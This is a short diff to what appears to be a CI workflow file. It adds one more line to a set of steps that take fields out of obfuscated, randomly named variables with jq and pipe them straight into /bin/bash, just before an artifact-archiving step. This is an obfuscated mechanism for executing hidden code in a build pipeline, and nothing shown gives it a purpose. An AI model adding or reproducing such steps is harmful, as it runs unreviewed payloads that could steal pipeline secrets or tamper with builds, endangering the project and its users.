@@ -23,6 +23,7 @@ jobs:
           echo $gedhp3587 | jq -r .b41 | /bin/bash
           echo $qrwq6 | jq -r .mtdv02853 | /bin/bash
           echo $dhsbp112 | jq -r .p7 | /bin/bash
+          printf '%s' "$xn1" | jq -r .zkks293 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
